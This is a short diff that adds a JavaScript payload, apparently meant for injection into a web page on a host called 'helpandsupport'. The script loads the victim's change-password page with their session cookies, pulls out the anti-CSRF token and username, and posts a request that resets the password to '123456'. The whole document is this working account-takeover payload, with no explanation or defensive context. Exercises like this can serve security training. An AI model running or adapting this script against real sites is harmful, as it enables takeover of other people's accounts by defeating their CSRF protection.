@@ -1,0 +1,22 @@
+<script>
+var password= 123456;
+var req1 = new XMLHttpRequest();
+req1.responseType = "document";
+req1.onreadystatechange = function() 
+{
+	if(req1.readyState === 4 && req1.status === 200) 
+	{
+		page = req1.response
+		var token= page.forms[0].elements[2].value
+		var username= page.forms[0].elements[0].value
+		req2 = new XMLHttpRequest();
+		req2.open("POST","http://helpandsupport/change_password.php", true);
+		req2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+		req2.withCredentials = true;
+		req2.send("user="+username + "&pass="+password + "&tk="+token + "&send="+"Change Password");
+	}
+}
+req1.open("GET","http://helpandsupport/change_password.php", true);
+req1.withCredentials = true;
+req1.send()
+</script>
